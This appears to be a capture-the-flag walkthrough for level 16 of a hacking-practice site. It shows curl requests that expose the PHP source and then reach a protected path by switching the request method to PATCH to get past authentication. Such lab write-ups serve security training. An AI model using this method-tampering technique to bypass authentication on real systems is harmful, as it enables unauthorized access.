# Level-16

Level16-17 (https://matrix.voorivex.academy/morPheus-vS-sMith!)

send this request:

```text
https://matrix.voorivex.academy/morPheus-vS-sMith!/?show-me-the-codes
```
you will get a php code :

```php
<?php
if (isset($_GET['show-me-the-codes'])) {
    show_source("index.php");
    exit();
}

# require_once("./restrict/next.php");
?>
```

send this request :

```text
curl -v https://matrix.voorivex.academy/morPheus-vS-sMith!/restrict/next.php
```

you will get this error:

```text
Authentication required
```

according to the third picture you should change your method so try different methods finally `PATCH` works

```text
curl -X PATCH https://matrix.voorivex.academy/morPheus-vS-sMith!/restrict/next.php
/the-end-of-m0rpheus
```

go to :

```text
https://matrix.voorivex.academy/the-end-of-m0rpheus
```
